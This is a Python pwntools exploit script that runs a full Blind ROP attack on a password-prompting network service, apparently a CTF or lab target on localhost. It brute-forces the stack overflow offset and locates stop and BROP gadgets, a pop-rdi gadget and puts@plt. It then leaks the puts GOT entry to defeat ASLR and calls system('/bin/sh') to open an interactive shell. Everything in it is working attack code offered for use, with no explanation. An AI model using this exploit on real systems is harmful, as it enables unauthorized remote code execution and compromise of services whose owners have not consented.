from pwn import *

ip = "127.0.0.1"
port = 10001

#context.log_level = "error"

def slog(name, addr):
    return success(" : ".join([name, hex(addr)]))

def find_Overflow():
    for i in range(1, 0x100):
        payload = b"A" * i
        try:
            with remote(ip, port, level = 'error') as io:
                io.sendafter("password?\n", payload)
                res = io.recv(timeout = 0.5).decode()
                io.close()
                if "No password" in res:
                    i += 1
        except EOFError as e:
            io.close()
            return i-1

base = 0x400000
def find_stop_gadget(size):
    for i in range(0, 0x1000):
        stop_gadget = base + i
        payload = b"A" * size
        payload += p64(stop_gadget)
        try:
            with remote(ip, port, level = 'error') as io:
                io.sendafter("password?\n", payload)
                res = io.recv(timeout = 0.5).decode()
                if "WelCome my friend" in res:
                    io.close()
                    return stop_gadget
        except Exception as e:
            io.close()

def find_brop_gadget(size, stop_gadget):
    print("Searching BROP Gadget...")
    for i in range(0x0, 0x1000):
        brop_gadget = int(base + i)
        if maybe_brop_gadget(size, stop_gadget, brop_gadget):
            print("maybe_brop_gadget : ", hex(brop_gadget))
            if is_brop_gadget(size, brop_gadget):
                print("Find BROP Gadget : ", hex(brop_gadget))
                return brop_gadget

def maybe_brop_gadget(size, stop_gadget, brop_gadget):
    try:
        payload = b"A" * size
        payload += p64(brop_gadget)
        payload += p64(0) * 6
        payload += p64(stop_gadget)
        with remote(ip, port, level = 'error') as io:
            io.sendafter("password?\n", payload)
            res = io.recv(1024, timeout = 0.2).decode()
            io.close()
            if "WelCome my friend" in res:
                print("find BROP or STOP : ", hex(brop_gadget))
                return True
            return False
    except Exception as e:
        io.close()
        return False

def is_brop_gadget(size, brop_gadget):
    try:
        payload = b"A" * size
        payload += p64(brop_gadget)
        payload += p64(0x0) * 0x10
        with remote(ip, port, level = 'error') as io:
            io.sendafter("password?\n", payload)
            res = io.recv(1024, timeout = 0.5).decode()
            if "WelCome my friend" in res:
                io.close()
                return False
    except Exception as e:
        io.close()
        print("Find BROP Gadget : ", hex(brop_gadget))
        return True

def find_puts_plt(size, pop_rdi_ret):
    for i in range(0x0, 0x1000):
        puts_plt = int(base + i)
        payload = b"A" * size
        payload += p64(pop_rdi_ret)
        payload += p64(0x400000)
        payload += p64(puts_plt)
        try:
            with remote(ip, port, level='error') as io:
                io.sendafter("password?\n", payload)
                res = io.recv(1024, timeout = 0.2).decode()
                if res.startswith("\x7fELF"):
                    io.close()
                    return puts_plt
        except Exception as e:
            io.close()

def memory_dump(size, stop_gadget, pop_rdi_ret, puts_plt):
    now = base
    end = 0x401000
    dump = b""
    while now < end:
        if now % 0x100 == 0:
            print("now : ", hex(now))
        payload = b"A" * size
        payload += p64(pop_rdi_ret)
        payload += p64(now)
        payload += p64(puts_plt)
        payload += p64(stop_gadget)
        slog("now", now)
        try:
            with remote(ip, port, level = 'error') as io:
                io.sendafter("password?\n", payload)
                data = io.recv()
                io.close()
                data = data[:data.index(b"\nWelCome")]
        except ValueError as e:
            data = data
        except Exception as e:
            continue

        if len(data.split()) == 0:
            data = b'\x00'

        dump += data
        now += len(data)
        print("dump : ", dump)
    with open("memory.dump", "wb") as f:
        f.write(dump)

def find_puts_got(size, pop_rdi_ret, puts_plt, stop_gadget):
    payload = b"A" * size
    payload += p64(pop_rdi_ret)
    payload += p64(0x601018)
    payload += p64(puts_plt)
    payload += p64(stop_gadget)
    try:
        with remote(ip, port, level = 'error') as io:
            io.sendafter("password?\n", payload)
            data = u64(io.recvn(6) + b"\x00" * 2)
            io.close()
            return data
    except Exception as e:
        return False

libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
system_offset = libc.symbols["system"]
binsh_offset = 0x1a7e43
puts_offset = libc.symbols["puts"]

def get_shell(size, stop_gadget, pop_rdi_ret, puts_got, puts_plt):
    print("Enter get_shell")
    payload1 = b"A" * size
    payload1 += p64(pop_rdi_ret)
    payload1 += p64(0x601018)
    payload1 += p64(puts_plt)
    payload1 += p64(stop_gadget)
    try:
        with remote(ip, port) as io:
            io.sendafter("password?\n", payload1)
            puts_got = u64(io.recvn(6) + b"\x00" * 2)
            slog("puts_got", puts_got)
            libc_base = puts_got - puts_offset
            system_addr = system_offset + libc_base
            binsh_addr = binsh_offset + libc_base
            slog("libc_base", libc_base)

            payload2 = b"A" * size
            payload2 += p64(pop_rdi_ret)
            payload2 += p64(binsh_addr)
            payload2 += p64(pop_rdi_ret + 1)
            payload2 += p64(system_addr)
            io.sendafter("password?\n", payload2)
            io.interactive()
    except Exception as e:
        print("get_shell Fail")

size = find_Overflow()
print(size)

stop_gadget = find_stop_gadget(size)
print("Find Stop_Gadget : ", hex(stop_gadget))

brop_gadget = find_brop_gadget(size, stop_gadget)
pop_rdi_ret = brop_gadget + 0x9
print("Find BROP_Gadget : ", hex(brop_gadget))
print("Find pop_rdi_ret : ", hex(pop_rdi_ret))

puts_plt = find_puts_plt(size, pop_rdi_ret)
print("Find puts_plt : ", hex(puts_plt))


#memory_dump(size, stop_gadget, pop_rdi_ret, puts_plt)
#print("Done Dump")

puts_got = find_puts_got(size, pop_rdi_ret, puts_plt, stop_gadget)
print("Find puts got : ", hex(puts_got))

get_shell(size, stop_gadget, pop_rdi_ret, puts_got, puts_plt)
